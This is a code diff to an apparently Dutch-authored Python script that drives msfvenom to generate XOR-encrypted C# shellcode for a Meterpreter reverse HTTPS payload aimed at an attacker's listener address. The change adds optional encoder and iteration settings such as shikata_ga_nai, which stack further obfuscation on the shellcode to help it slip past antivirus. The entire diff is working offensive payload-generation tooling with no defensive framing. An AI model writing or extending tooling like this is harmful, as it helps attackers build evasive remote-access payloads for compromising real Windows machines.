@@ -20,6 +20,8 @@ parser.add_argument("lhost", help="listener IP to use")
 parser.add_argument("lport", help="listener port to use", nargs='?', default="443")
 parser.add_argument("luri", help="uri to call", nargs='?', default="/")
 parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_https)", nargs='?', default="windows/x64/meterpreter/reverse_https")
+parser.add_argument("--encoder", help="msfvenom encoder (bijv. x86/shikata_ga_nai)", default="")
+parser.add_argument("--iterations", help="encoder iterations", type=int, default=0)
 args = parser.parse_args()
 
 
@@ -38,10 +40,17 @@ waar = ''.join(random.choice(letters) for i in range(randint(4,8)))
 
 if args.luri:
     print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and  LURI={bcolors.OKGREEN}{args.luri}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
-    result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}",  f"LURI={args.luri}",'exitfunc=thread', '--encrypt', 'xor', '--encrypt-key', sleutel,  "-f", "csharp"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    msf_cmd = ['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", f"LURI={args.luri}", 'exitfunc=thread', '--encrypt', 'xor', '--encrypt-key', sleutel]
 else:
     print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
-    result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', '--encrypt', 'xor', '--encrypt-key', sleutel, "-f", "csharp"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    msf_cmd = ['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', '--encrypt', 'xor', '--encrypt-key', sleutel]
+
+if args.encoder:
+    msf_cmd.extend(["-e", args.encoder])
+    if args.iterations > 0:
+        msf_cmd.extend(["-i", str(args.iterations)])
+msf_cmd.extend(["-f", "csharp"])
+result = subprocess.run(msf_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 if result.returncode != 0:
